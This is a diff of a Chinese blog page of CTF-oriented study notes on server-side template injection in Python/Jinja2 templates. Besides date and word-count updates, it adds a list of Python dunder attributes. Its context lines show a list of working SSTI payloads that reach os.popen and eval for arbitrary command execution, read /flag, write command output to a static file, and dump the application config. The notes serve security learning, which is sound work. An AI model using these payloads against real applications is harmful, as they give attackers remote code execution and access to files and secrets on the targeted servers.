@@ -27,7 +27,7 @@
 <meta property="og:description" content="一点关于ssti的学习笔记以 Djingo为例 当然不仅仅只有python的ssti 其他语言也有，甚至Rust都有 不会就试试fenjing一把梭哈 常见payload123456789101112131415161718192021221、任意命令执行&#123;%for i in &#x27;&#x27;.__class__.__base__.__subclasses__()%&#125;&amp;">
 <meta property="og:locale" content="zh_CN">
 <meta property="article:published_time" content="2025-01-19T13:00:24.000Z">
-<meta property="article:modified_time" content="2025-02-11T01:51:56.640Z">
+<meta property="article:modified_time" content="2025-03-09T11:36:09.556Z">
 <meta property="article:author" content="tuyi">
 <meta property="article:tag" content="ssti">
 <meta name="twitter:card" content="summary_large_image">
@@ -231,7 +231,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          2.6k 字
+          2.7k 字
         
       </span>
     
@@ -242,7 +242,7 @@
         
         
         
-          22 分钟
+          23 分钟
         
       </span>
     
@@ -284,7 +284,7 @@
               <p id="updated-time" class="note note-info" style="">
                 
                   
-                    本文最后更新于 2025年2月11日 上午
+                    本文最后更新于 2025年3月9日 晚上
                   
                 
               </p>
@@ -296,6 +296,17 @@
 <p>不会就试试<strong>fenjing一把梭哈</strong></p>
 <h1 id="常见payload"><a href="#常见payload" class="headerlink" title="常见payload"></a>常见payload</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-number">1</span>、任意命令执行<br>&#123;%<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__()%&#125;&#123;%<span class="hljs-keyword">if</span> i.__name__ ==<span class="hljs-string">&#x27;_wrap_close&#x27;</span>%&#125;&#123;%<span class="hljs-built_in">print</span> i.__init__.__globals__[<span class="hljs-string">&#x27;popen&#x27;</span>](<span class="hljs-string">&#x27;dir&#x27;</span>).read()%&#125;&#123;%endif%&#125;&#123;%endfor%&#125;<br><span class="hljs-number">2</span>、任意命令执行<br>&#123;&#123;<span class="hljs-string">&quot;&quot;</span>.__class__.__bases__[<span class="hljs-number">0</span>]. __subclasses__()[<span class="hljs-number">138</span>].__init__.__globals__[<span class="hljs-string">&#x27;popen&#x27;</span>](<span class="hljs-string">&#x27;cat /flag&#x27;</span>).read()&#125;&#125;<br>//这个<span class="hljs-number">138</span>对应的类是os._wrap_close，只需要找到这个类的索引就可以利用这个payload<br><span class="hljs-number">3</span>、任意命令执行<br>&#123;&#123;url_for.__globals__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>][<span class="hljs-string">&#x27;eval&#x27;</span>](<span class="hljs-string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;dir&#x27;).read()&quot;</span>)&#125;&#125;<br><span class="hljs-number">4</span>、任意命令执行<br>&#123;&#123;x.__init__.__globals__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>][<span class="hljs-string">&#x27;eval&#x27;</span>](<span class="hljs-string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;cat flag&#x27;).read()&quot;</span>)&#125;&#125;<br>//x的含义是可以为任意字母，不仅仅限于x<br><span class="hljs-number">5</span>、任意命令执行<br>&#123;&#123;config.__init__.__globals__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>][<span class="hljs-string">&#x27;eval&#x27;</span>](<span class="hljs-string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;cat flag&#x27;).read()&quot;</span>)&#125;&#125;<br><span class="hljs-number">6</span>、文件读取<br>&#123;&#123;x.__init__.__globals__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>].<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;/flag&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>).read()&#125;&#125;<br>//x的含义是可以为任意字母，不仅仅限于x<br><span class="hljs-number">7.</span>任意命令执行<br>&#123;&#123;lipsum.__globals__[<span class="hljs-string">&#x27;os&#x27;</span>].popen(<span class="hljs-string">&#x27;cat /app/flag&#x27;</span>).read()&#125;&#125;<br><span class="hljs-number">8.</span>不出网写静态文件<br>&#123;&#123;lipsum.__globals__[<span class="hljs-string">&#x27;os&#x27;</span>].popen(<span class="hljs-string">&#x27;echo cat /app/flag &gt;/app/static/1.txt&#x27;</span>).read()&#125;&#125;<br><span class="hljs-number">9.</span>当config是<span class="hljs-literal">None</span>时，尝试读取current_app的config<br>&#123;&#123;url_for.__globals__[<span class="hljs-string">&#x27;current_app&#x27;</span>].config&#125;&#125;<br><br></code></pre></td></tr></table></figure>
 
+<h1 id="常见的内置方法"><a href="#常见的内置方法" class="headerlink" title="常见的内置方法"></a>常见的内置方法</h1><ul>
+<li>__class__返回对象对应的类</li>
+<li>__module__返回对应类对应的模块</li>
+<li>__bases__返回类所有的父类</li>
+<li>__base__返回类的基类</li>
+<li>__name__返回类名</li>
+<li>__mro__返回解析方法调用类的顺序的元组</li>
+<li>_<em>subclasses</em>_()可以举所有在内存中存在的类 注意他是一个函数</li>
+<li>__init__重新加载类的属性</li>
+<li>__globals__会以字典的形式返回当前位置的全部全局变量</li>
+</ul>
 <h1 id="常见方法"><a href="#常见方法" class="headerlink" title="常见方法"></a>常见方法</h1><p>获取键值或下标的方式</p>
 <figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs stylus">dict<span class="hljs-selector-attr">[<span class="hljs-string">&#x27;__builtins__&#x27;</span>]</span><br>dict.<span class="hljs-built_in">__getitem__</span>(<span class="hljs-string">&#x27;__builtins__&#x27;</span>)<br>dict<span class="hljs-selector-class">.pop</span>(<span class="hljs-string">&#x27;__builtins__&#x27;</span>)<br>dict<span class="hljs-selector-class">.get</span>(<span class="hljs-string">&#x27;__builtins__&#x27;</span>)<br>dict<span class="hljs-selector-class">.setdefault</span>(<span class="hljs-string">&#x27;__builtins__&#x27;</span>)<br>list<span class="hljs-selector-attr">[0]</span><br>list.<span class="hljs-built_in">__getitem__</span>(<span class="hljs-number">0</span>)<br>list<span class="hljs-selector-class">.pop</span>(<span class="hljs-number">0</span>)<br></code></pre></td></tr></table></figure>
 
@@ -506,7 +517,7 @@
       
         <div class="license-meta-item license-meta-date">
           <div>更新于</div>
-          <div>2025年2月11日</div>
+          <div>2025年3月9日</div>
         </div>
       
       
